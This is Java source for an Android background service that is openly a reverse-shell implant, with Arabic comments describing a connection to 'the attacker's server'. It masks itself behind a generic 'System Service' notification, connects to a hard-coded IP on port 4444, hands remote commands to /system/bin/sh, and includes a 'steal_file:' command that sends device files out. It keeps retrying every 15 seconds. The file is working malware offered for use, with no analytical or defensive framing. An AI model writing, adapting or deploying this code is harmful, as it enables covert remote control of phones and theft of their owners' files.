herepackage com.example.pureshell;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class AdvancedShellService extends Service {

    private Thread workerThread;
    private volatile boolean isRunning = true;

    private static final String TARGET_IP = "192.168.8.142";
    private static final int TARGET_PORT = 4444;
    private static final String CHANNEL_ID = "SysChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundServiceNotification();
    }

    private void startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running background tasks...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();

        startForeground(1, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startConnectionLoop();
        return START_STICKY;
    }

    private void startConnectionLoop() {
        if (workerThread != null && workerThread.isAlive()) return;

        workerThread = new Thread(() -> {
            while (isRunning) {
                try {
                    // 1. الاتصال العكسي بسيرفر المخترق
                    Socket socket = new Socket(TARGET_IP, TARGET_PORT);
                    InputStream netIn = socket.getInputStream();
                    OutputStream netOut = socket.getOutputStream();

                    // 2. تشغيل واجهة الأوامر الداخلية في أندرويد
                    Process process = Runtime.getRuntime().exec("/system/bin/sh");
                    InputStream sysIn = process.getInputStream();
                    InputStream sysErr = process.getErrorStream();
                    OutputStream sysOut = process.getOutputStream();

                    // 3. خيط لاستقبال الأوامر من المخترق وتنفيدها (مع ميزة سرقة الملفات)
                    Thread inputHandler = new Thread(() -> {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = netIn.read(buffer)) != -1) {
                                String command = new String(buffer, 0, len).trim();

                                if (command.startsWith("steal_file:")) {
                                    String filePath = command.replace("steal_file:", "").trim();
                                    sendFileToAttacker(filePath, netOut);
                                    continue;
                                }

                                sysOut.write(buffer, 0, len);
                                sysOut.flush();
                            }
                        } catch (Exception ignored) {}
                    });
                    inputHandler.start();

                    // 4. خيط لإرسال نتائج الأوامر والبيانات للمخترق
                    Thread outputHandler = new Thread(() -> {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = sysIn.read(buffer)) != -1 || (len = sysErr.read(buffer)) != -1) {
                                netOut.write(buffer, 0, len);
                                netOut.flush();
                            }
                        } catch (Exception ignored) {}
                    });
                    outputHandler.start();

                    process.waitFor();
                    socket.close();

                } catch (Exception e) {
                    try {
                        Thread.sleep(15000); // إعادة المحاولة بعد 15 ثانية في حال انقطع الاتصال
                    } catch (InterruptedException ignored) {}
                }
            }
        });
        workerThread.start();
    }

    private void sendFileToAttacker(String path, OutputStream out) {
        try {
            File file = new File(path);
            if (file.exists() && file.canRead()) {
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int count;
                while ((count = fis.read(buffer)) > 0) {
                    out.write(buffer, 0, count);
                    out.flush();
                }
                fis.close();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (workerThread != null) {
            workerThread.interrupt();
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
